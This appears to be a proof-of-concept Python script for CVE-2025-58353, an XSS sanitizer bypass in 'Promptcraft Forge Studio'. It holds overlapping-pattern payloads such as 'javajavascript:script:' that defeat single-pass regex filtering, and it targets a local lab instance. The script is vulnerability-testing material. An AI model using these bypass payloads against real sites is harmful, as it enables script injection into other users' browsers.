#!/usr/bin/env python3
"""
CVE-2025-58353 - Promptcraft Forge Studio XSS via Sanitizer Bypass

The sanitizeInput function uses single-pass regex replacement:
  .replace(/javascript:/gi, '')
  .replace(/on\w+\s*=/gi, '')
  .replace(/data:text\/html/gi, '')

By using overlapping patterns like "javajavascript:script:", after first 
replacement it becomes "javascript:" which is still executable.
"""

import requests
import time
import sys
from urllib.parse import quote

TARGET_URL = "http://localhost:18080"

XSS_PAYLOADS = [
    {
        "name": "javascript: bypass via overlap",
        "payload": "javajavascript:script:alert(document.domain)",
        "sanitized_result": "javascript:alert(document.domain)",
    },
    {
        "name": "data:text/html bypass via overlap", 
        "payload": "dadata:text/htmlta:text/html,<script>alert(1)</script>",
        "sanitized_result": "data:text/html,<script>alert(1)</script>",
    },
    {
        "name": "onerror bypass via overlap",
        "payload": "oonerror=nerror=alert(1)",
        "sanitized_result": "onerror=alert(1)",
    },
]

def simulate_sanitize(input_str):
    """Python simulation of the vulnerable sanitizeInput function"""
    import re
    result = input_str.strip()
    entities = {
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '&': '&amp;'
    }
    for char, entity in entities.items():
        result = result.replace(char, entity)
    result = re.sub(r'javascript:', '', result, flags=re.IGNORECASE)
    result = re.sub(r'on\w+\s*=', '', result, flags=re.IGNORECASE)
    result = re.sub(r'data:text/html', '', result, flags=re.IGNORECASE)
    return result

def test_sanitizer_bypass():
    """Test the sanitizer bypass vulnerability"""
    print("=" * 60)
    print("CVE-2025-58353 - Sanitizer Bypass XSS PoC")
    print("=" * 60)
    print()
    
    all_passed = True
    
    for test in XSS_PAYLOADS:
        print(f"[*] Testing: {test['name']}")
        print(f"    Original payload:  {test['payload']}")
        
        sanitized = simulate_sanitize(test['payload'])
        print(f"    After sanitize:    {sanitized}")
        
        dangerous_patterns = ['javascript:', 'onclick=', 'onerror=', 'data:text/html']
        is_dangerous = any(p in sanitized.lower() for p in dangerous_patterns)
        
        if is_dangerous:
            print(f"    [VULNERABLE] Dangerous pattern still present after sanitization!")
            print()
        else:
            print(f"    [SAFE] No dangerous patterns found")
            all_passed = False
            print()
    
    return all_passed

def check_target_accessible():
    """Check if target application is running"""
    print(f"[*] Checking if target is accessible at {TARGET_URL}...")
    try:
        resp = requests.get(TARGET_URL, timeout=10)
        if resp.status_code == 200:
            print(f"[+] Target is accessible (HTTP {resp.status_code})")
            return True
        else:
            print(f"[-] Target returned HTTP {resp.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Cannot connect to target: {e}")
        return False

def main():
    print()
    print("Testing CVE-2025-58353 - Promptcraft Forge Studio XSS")
    print()
    
    vuln_confirmed = test_sanitizer_bypass()
    
    print("=" * 60)
    print("Target Application Check")
    print("=" * 60)
    print()
    
    target_up = check_target_accessible()
    
    print()
    print("=" * 60)
    print("Summary")
    print("=" * 60)
    print()
    
    if vuln_confirmed:
        print("[+] VULNERABILITY CONFIRMED: Sanitizer bypass allows XSS payloads")
        print()
        print("Exploitation steps:")
        print("1. User inputs a malicious value like 'javajavascript:script:alert(1)'")
        print("2. The sanitizeInput function removes 'javascript:' once")
        print("3. Result: 'javascript:alert(1)' - still executable!")
        print("4. When rendered in href/src or via innerHTML, XSS triggers")
        print()
        if target_up:
            print(f"[+] Target application is running at {TARGET_URL}")
            print("[+] Manual verification: Open browser, go to Builder page,")
            print("    enter payload in a prompt block, and check if XSS triggers")
        else:
            print(f"[-] Target application not running. Start with: docker-compose up -d")
        
        return 0
    else:
        print("[-] Vulnerability test failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
